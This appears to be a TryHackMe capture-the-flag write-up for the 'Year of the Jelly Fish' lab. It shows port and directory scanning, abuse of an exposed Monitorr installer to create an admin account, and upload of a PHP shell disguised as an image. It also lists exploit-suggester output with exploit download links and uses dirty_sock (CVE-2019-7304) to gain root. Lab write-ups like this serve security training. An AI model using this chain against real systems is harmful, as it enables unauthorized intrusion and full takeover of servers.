# yotjf
TryHackMe - Year of the Jelly Fish

## Adding ip to /etc/hosts

```
34.248.251.102 robyns-petshop.thm
34.248.251.102 monitorr.robyns-petshop.thm
export IP=34.248.251.102
```

## Recon

nmap scan

```
21/tcp  open  ftp      vsftpd 3.0.3
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
```
## Gobuster scan (with -k to disable certificate checks)

```
gobuster dir -u https://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php,asp
```
Results

```
/index.php            (Status: 200) [Size: 3639]
/content              (Status: 301) [Size: 320] [--> https://34.248.251.102/content/]
/themes               (Status: 301) [Size: 319] [--> https://34.248.251.102/themes/] 
/business             (Status: 401) [Size: 462]                                      
/assets               (Status: 301) [Size: 319] [--> https://34.248.251.102/assets/] 
/plugins              (Status: 301) [Size: 320] [--> https://34.248.251.102/plugins/]
/vendor               (Status: 301) [Size: 319] [--> https://34.248.251.102/vendor/] 
/config               (Status: 301) [Size: 319] [--> https://34.248.251.102/config/] 
/LICENSE              (Status: 200) [Size: 1085]   
```
```
gobuster dir -u https://monitorr.robyns-petshop.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```
Results

```
/data
/assets
```

## Viewing the site

robyns-petshop.thm

```
Email: staff@robyns-petshop.thm
```
https://monitorr.robyns-petshop.thm/assets/config/_installation/default/monitorr_data_directory_default.txt

```
- If the credentials to the settings page need to be changed or reset, rename the file in this directory â€˜users.dbâ€™ to 'users.old'.  Once that file is renamed,  browse to the Monitorr settings page again to establish a new user database.  
-  NOTE: This process will NOT overwrite your current settings unless you choose to create a NEW data directory.
```
## Finding Vulnerability

```
https://monitorr.robyns-petshop.thm/assets/config/_installation/vendor/_install.php
Database ../users.db was created, installation was successful.
```
Registering new user

```
https://monitorr.robyns-petshop.thm/assets/config/_installation/vendor/login.php?action=register
Your account has been created successfully. You can now log in.
```
Logging In

```
https://monitorr.robyns-petshop.thm/assets/config/_installation/vendor/login.php
Hello admin, you are logged in.
```
Uploading a shell

```
Upload image ../data/usrimg/shell.png.php 
```
## Task 1

Listening on nc and link trigerred

```
cat ~/flag1.txt
```

## Task 2

Enumeration Results

```
Searching among:

76 kernel space exploits
48 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2019-7304] dirty_sock

   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

```

Using [CVE-2019-7304] dirty_sock

```
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/snkzlvntpa;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...



********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************
```

Finding the flag

```
dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg/dirty_sock-master$ whoami
<nitorr/assets/data/usrimg/dirty_sock-master$ whoami                       
dirty_sock
dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg/dirty_sock-master$ sudo cat /root/root.txt
<a/usrimg/dirty_sock-master$ sudo cat /root/root.txt                       
[sudo] password for dirty_sock: dirty_sock

```
